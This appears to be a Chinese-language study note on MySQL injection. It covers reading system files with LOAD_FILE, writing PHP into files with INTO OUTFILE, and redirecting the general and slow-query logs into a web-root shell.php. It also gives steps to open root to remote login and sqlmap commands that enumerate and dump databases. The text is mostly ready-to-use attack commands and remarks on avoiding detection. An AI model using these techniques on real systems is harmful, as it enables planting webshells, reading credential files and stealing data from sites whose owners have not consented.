# day4 mysql注入读写文件以及权限问题&&sqlmap初识

### 判断用户是否具有file权限

```React JSX
select file_priv,user,host from mysql.user;
```


### 查看可写入的路径

```React JSX
secure_file_priv=''

secure_file_priv可以设置如下这样进行设置：
1. 设置为空，那么对所有路径均可进行导入导出。
2. 设置为一个目录名字，那么只允许在该路径下导入导出。
3. 设置为Null，那么禁止所有导入导出。
Mysql>=5.5.53 默认为NULL，即默认禁止导入导出，并且不能通过sql语句进行修改
Mysql<5.5.53 默认为空，即默认无限制

需要在mysql的配置文件中更改：
[mysqld]
secure_file_priv=""
```






### load_file读取文件

```React JSX
SELECT LOAD_FILE('/etc/passwd');
windows系统下文件路径用正斜杠
```




### select into  写入文件

```React JSX
select '<?php phpinfo(); ?>' into outfile 'c:/1.txt';
```


### 写入日志文件



查询日志文件位置

```React JSX
show variables like '%general%';
```


开启日志记录，一般情况下都是没有开的

```React JSX
set global general_log = on;

```


设置日志记录的位置

```React JSX
set global general_log_file = 'G:/2.txt';

```


然后直接输入便可被记录下来

最后记得改回原来的日志路径，并且关闭日志记录

### 慢查询写shell

当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志

由于开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错,还有可能被发现

```React JSX
show variables like '%slow_query_log%';    查看慢查询信息

set global slow_query_log=1;        启用慢查询日志(默认禁用)

set global slow_query_log_file='C:\phpStudy\WWW\shell.php';  修改日志文件路径

select '123123' or sleep(11);        写文件
```




Mysql登录用户名密码存储在C:\phpstudy_pro\Extensions\MySQL5.7.26\data\mysql\user.MYD中

### mysql远程登录设置

```React JSX
use mysql;
select host,user from user；
update user set host = ’%’ where user = ’root’; 将host值改为%即可
flush privileges;  刷新权限



```




### sqlmap使用

询数据库：sqlmap -u url -dbs

查某数据库中的表 sqlmap -u url -D 数据库名 -tables

查询某数据库中某表的列 sqlmap -u url -D 数据库名 -T 表名 -columns

查询表中的信息 sqlmap -u url -D 数据库名 -T 表名 -C 字段1,字段2,字段3 --dump



